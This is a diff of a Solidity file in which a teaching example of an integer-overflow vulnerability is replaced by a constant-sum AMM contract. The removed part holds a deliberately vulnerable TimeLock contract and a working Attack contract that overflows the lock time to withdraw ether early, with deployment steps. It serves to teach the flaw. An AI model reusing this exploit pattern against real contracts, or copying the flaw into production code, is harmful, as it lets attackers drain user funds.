@@ -1,82 +1,141 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.7.6;
+pragma solidity ^0.8.17;
 
-/*
-Arithmetic Overflow and Underflow Vulnerability
+contract CSAMM {
+    IERC20 public immutable token0;
+    IERC20 public immutable token1;
 
-Solidity < 0.8
-Integers in Solidity overflow / underflow without any errors
+    uint public reserve0;
+    uint public reserve1;
 
-Solidity >= 0.8
-Default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.
-*/
+    uint public totalSupply;
+    mapping(address => uint) public balanceOf;
 
-// This contract is designed to act as a time vault.
-// User can deposit into this contract but cannot withdraw for at least a week.
-// User can also extend the wait time beyond the 1 week waiting period.
-
-/*
-1. Deploy TimeLock
-2. Deploy Attack with address of TimeLock
-3. Call Attack.attack sending 1 ether. You will immediately be able to
-   withdraw your ether.
-
-What happened?
-Attack caused the TimeLock.lockTime to overflow and was able to withdraw
-before the 1 week waiting period.
-*/
-
-contract TimeLock {
-    mapping(address => uint) public balances;
-    mapping(address => uint) public lockTime;
-
-    function deposit() external payable {
-        balances[msg.sender] += msg.value;
-        lockTime[msg.sender] = block.timestamp + 1 weeks;
+    constructor(address _token0, address _token1) {
+        // NOTE: This contract assumes that token0 and token1
+        // both have same decimals
+        token0 = IERC20(_token0);
+        token1 = IERC20(_token1);
     }
 
-    function increaseLockTime(uint _secondsToIncrease) public {
-        lockTime[msg.sender] += _secondsToIncrease;
+    function _mint(address _to, uint _amount) private {
+        balanceOf[_to] += _amount;
+        totalSupply += _amount;
     }
 
-    function withdraw() public {
-        require(balances[msg.sender] > 0, "Insufficient funds");
-        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
+    function _burn(address _from, uint _amount) private {
+        balanceOf[_from] -= _amount;
+        totalSupply -= _amount;
+    }
 
-        uint amount = balances[msg.sender];
-        balances[msg.sender] = 0;
+    function _update(uint _res0, uint _res1) private {
+        reserve0 = _res0;
+        reserve1 = _res1;
+    }
 
-        (bool sent, ) = msg.sender.call{value: amount}("");
-        require(sent, "Failed to send Ether");
+    function swap(address _tokenIn, uint _amountIn) external returns (uint amountOut) {
+        require(
+            _tokenIn == address(token0) || _tokenIn == address(token1),
+            "invalid token"
+        );
+
+        bool isToken0 = _tokenIn == address(token0);
+
+        (IERC20 tokenIn, IERC20 tokenOut, uint resIn, uint resOut) = isToken0
+            ? (token0, token1, reserve0, reserve1)
+            : (token1, token0, reserve1, reserve0);
+
+        tokenIn.transferFrom(msg.sender, address(this), _amountIn);
+        uint amountIn = tokenIn.balanceOf(address(this)) - resIn;
+
+        // 0.3% fee
+        amountOut = (amountIn * 997) / 1000;
+
+        (uint res0, uint res1) = isToken0
+            ? (resIn + amountIn, resOut - amountOut)
+            : (resOut - amountOut, resIn + amountIn);
+
+        _update(res0, res1);
+        tokenOut.transfer(msg.sender, amountOut);
+    }
+
+    function addLiquidity(uint _amount0, uint _amount1) external returns (uint shares) {
+        token0.transferFrom(msg.sender, address(this), _amount0);
+        token1.transferFrom(msg.sender, address(this), _amount1);
+
+        uint bal0 = token0.balanceOf(address(this));
+        uint bal1 = token1.balanceOf(address(this));
+
+        uint d0 = bal0 - reserve0;
+        uint d1 = bal1 - reserve1;
+
+        /*
+        a = amount in
+        L = total liquidity
+        s = shares to mint
+        T = total supply
+
+        s should be proportional to increase from L to L + a
+        (L + a) / L = (T + s) / T
+
+        s = a * T / L
+        */
+        if (totalSupply > 0) {
+            shares = ((d0 + d1) * totalSupply) / (reserve0 + reserve1);
+        } else {
+            shares = d0 + d1;
+        }
+
+        require(shares > 0, "shares = 0");
+        _mint(msg.sender, shares);
+
+        _update(bal0, bal1);
+    }
+
+    function removeLiquidity(uint _shares) external returns (uint d0, uint d1) {
+        /*
+        a = amount out
+        L = total liquidity
+        s = shares
+        T = total supply
+
+        a / L = s / T
+
+        a = L * s / T
+          = (reserve0 + reserve1) * s / T
+        */
+        d0 = (reserve0 * _shares) / totalSupply;
+        d1 = (reserve1 * _shares) / totalSupply;
+
+        _burn(msg.sender, _shares);
+        _update(reserve0 - d0, reserve1 - d1);
+
+        if (d0 > 0) {
+            token0.transfer(msg.sender, d0);
+        }
+        if (d1 > 0) {
+            token1.transfer(msg.sender, d1);
+        }
     }
 }
 
-contract Attack {
-    TimeLock timeLock;
+interface IERC20 {
+    function totalSupply() external view returns (uint);
 
-    constructor(TimeLock _timeLock) {
-        timeLock = TimeLock(_timeLock);
-    }
+    function balanceOf(address account) external view returns (uint);
 
-    fallback() external payable {}
-    receive() external payable {}
+    function transfer(address recipient, uint amount) external returns (bool);
 
-    function attack() public payable {
-        timeLock.deposit{value: msg.value}();
-        /*
-        if t = current lock time then we need to find x such that
-        x + t = 2**256 = 0
-        so x = -t
-        2**256 = type(uint).max + 1
-        so x = type(uint).max + 1 - t
-        */
-        timeLock.increaseLockTime(
-            type(uint).max + 1 - timeLock.lockTime(address(this))
-        );
-        timeLock.withdraw();
-    }
+    function allowance(address owner, address spender) external view returns (uint);
 
-    function getBalance() public view returns (uint){
-        return address(this).balance;
-    }
+    function approve(address spender, uint amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint amount);
+    event Approval(address indexed owner, address indexed spender, uint amount);
 }
